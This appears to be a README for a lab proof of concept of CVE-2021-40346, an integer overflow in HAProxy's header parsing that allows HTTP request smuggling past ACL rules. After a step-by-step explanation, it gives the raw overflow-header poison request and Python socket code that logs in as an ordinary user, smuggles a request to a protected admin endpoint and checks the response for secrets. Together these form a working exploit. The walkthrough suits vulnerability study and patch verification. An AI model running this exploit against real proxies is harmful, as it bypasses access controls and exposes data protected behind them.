# CVE-2021-40346: HAProxy HTTP Request Smuggling - ACL Bypass

## Overview

This project demonstrates **CVE-2021-40346**, a critical integer overflow vulnerability in HAProxy that enables HTTP Request Smuggling attacks to bypass security controls.

**CVSSv3 Score:** 7.5 (High)  

---

## What is CVE-2021-40346?

CVE-2021-40346 is an **integer overflow vulnerability** in HAProxy's HTTP header parsing logic. When a header name exceeds 255 bytes, the length value overflows from an 8-bit field, causing HAProxy to misinterpret the header during request forwarding.

## How the Attack Works

### Step-by-Step Breakdown

1. **Attacker sends:** Header name = `"Content-Length0" + 255×'a'` = 270 bytes
2. **Phase 1 (Initial Parsing):**
   - HAProxy reads all 270 bytes of the header name
   - Stores `name_length = 270 % 256 = 14` (8-bit overflow)
   - The overflow bit sets `value_length = 1`
   - Reads the legitimate `Content-Length: 60` header and treats it as body length
   - Reads 60 bytes as the request body (containing the smuggled request)

3. **Phase 2 (Request Forwarding):**
   - Encounters the overflowed header block
   - Reads only first 14 characters: `"Content-Length"`
   - Reads 1 character for value (at position 14): `"0"`
   - Adds `content-length: 0` to the forwarded request
   - Ignores the real `Content-Length: 60` header (as per normal logic)

4. **Backend Processing:**
   - Receives `content-length: 0` from HAProxy
   - Parses POST request with no body
   - Treats the "body" (smuggled GET request) as the next HTTP request
   - Processes smuggled request, **bypassing all HAProxy ACLs**

---

## Attack Flow Example

### Bypassing ACL Rules to Access Admin Endpoint

Consider HAProxy configured with ACL rules that restrict access to admin routes:
```
http-request deny if { path_beg /users/admin }
```

In our PoC, we use a regular user session (alice) to access the protected `/users/admin` endpoint that should only be accessible to administrators.

**Malicious Request (Request 1 - Poison):**
```http
POST / HTTP/1.1
Host: 127.0.0.1:8080
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 78

GET /users/admin HTTP/1.1
Cookie: session=alice_session_token
DUMMY:
```

**Request HAProxy Forwards:**
```http
POST / HTTP/1.1
host: 127.0.0.1:8080
content-length: 0
x-forwarded-for: 192.168.188.1

GET /users/admin HTTP/1.1
Cookie: session=alice_session_token
DUMMY:
```

**Completion Request (Request 2):**
```http
GET / HTTP/1.1
Host: 127.0.0.1:8080

```

**Complete Smuggled Request Backend Processes:**
```http
GET /users/admin HTTP/1.1
Cookie: session=alice_session_token
DUMMY:GET / HTTP/1.1
Host: 127.0.0.1:8080

```

**Result:** 
1. HAProxy forwards POST / with `content-length: 0` (ACL sees safe route)
2. Backend processes POST / (no body) and waits for next request
3. Backend treats incomplete smuggled GET /users/admin as pending request
4. Request 2 completes the smuggled request
5. Backend processes GET /users/admin with alice's session, **bypassing HAProxy ACL**
6. Response containing admin secrets is returned to attacker

---

## Proof of Concept

### Key Exploit Sequences

The PoC demonstrates bypassing HAProxy ACLs to access `/users/admin` using a regular user's session through four key steps:

#### 1. Authenticating as Regular User

```python
# Login as alice (non-admin user)
body = "username=alice&password=alice123"
login = f"POST /login HTTP/1.1\r\n" \
        f"Host: {TARGET}:{PORT}\r\n" \
        f"Content-Type: application/x-www-form-urlencoded\r\n" \
        f"Content-Length: {len(body)}\r\n\r\n{body}".encode()

sock = socket.socket()
sock.connect((TARGET, PORT))
sock.sendall(login)
time.sleep(0.5)

# Receive response and extract session token
resp = b""
while True:
    chunk = sock.recv(4096)
    if not chunk:
        break
    resp += chunk
sock.close()

session = resp.decode().split('session=')[1].split(';')[0]
print(f"✓ Session: {session[:35]}...")
```

**Purpose:**
- Obtain a legitimate session token for regular user (alice)
- This session normally has **no access** to `/users/admin` endpoint
- We'll use this session in the smuggled request to bypass ACLs

#### 2. Building the Smuggled Request (Incomplete)

```python
# Craft incomplete smuggled request targeting admin endpoint
smuggled_incomplete = f"GET /users/admin HTTP/1.1\r\nCookie: session={session}\r\nDUMMY:"
```

**Critical Details:**
- Targets protected `/users/admin` route
- Uses legitimate user session (alice)
- Ends with `DUMMY:` header (no CRLF) to keep request incomplete
- Backend will wait for more data before processing

#### 3. Constructing the Poison Request

```python
# Create overflow header (270 bytes = 14 after 8-bit overflow)
overflow_header = "Content-Length0" + ("a" * 255)

# Build complete poison request
poison = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {TARGET}:{PORT}\r\n"
    f"{overflow_header}:\r\n"                    # Triggers integer overflow
    f"Content-Length: {len(smuggled_incomplete)}\r\n"  # Real body length
    f"\r\n"
    f"{smuggled_incomplete}"                     # Smuggled request as "body"
).encode()
```

**What Happens:**
- `Content-Length0aaa...` (270 bytes) overflows to 14 bytes
- HAProxy Phase 2 reads first 14 chars: `"Content-Length"`
- Value at position 14: `"0"`
- HAProxy forwards: `content-length: 0`
- Backend receives smuggled GET as pending request

#### 4. Sending the Requests

```python
# Send poison request
sock = socket.socket()
sock.connect((TARGET, PORT))
sock.sendall(poison)
time.sleep(1)
resp1 = sock.recv(4096)  # Receive POST / response

# Send completion request (completes smuggled request)
completion = (
    f"GET / HTTP/1.1\r\n"
    f"Host: {TARGET}:{PORT}\r\n"
    f"\r\n"
).encode()

sock.sendall(completion)
time.sleep(2)

# Capture the response of the smuggled request
all_data = b""
sock.settimeout(5)
try:
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        all_data += chunk
except:
    pass
sock.close()

# Decode and check for success
text = all_data.decode('utf-8', errors='ignore')

print(f"\n[RESULTS] {len(all_data)} bytes received")
print("="*70)
print(text)
print("="*70)

if "admin_secret" in text:
    print("\n✅ SUCCESS! BYPASSED HAPROXY ACL!")
    print("🔓 Stolen passwords visible in response above!")
else:
    print("\n⚠️  Check backend logs - smuggling is working but response capture needs adjustment")
```

**Request Flow:**
1. **Poison sent** → Backend buffers incomplete `GET /users/admin`
2. **Completion sent** → Concatenated to smuggled request, adding double CRLF
3. **Backend processes** → Complete `GET /users/admin` with alice's session
4. **Response captured** → All data received and decoded to UTF-8
5. **Success detection** → Checks for `admin_secret` keyword in response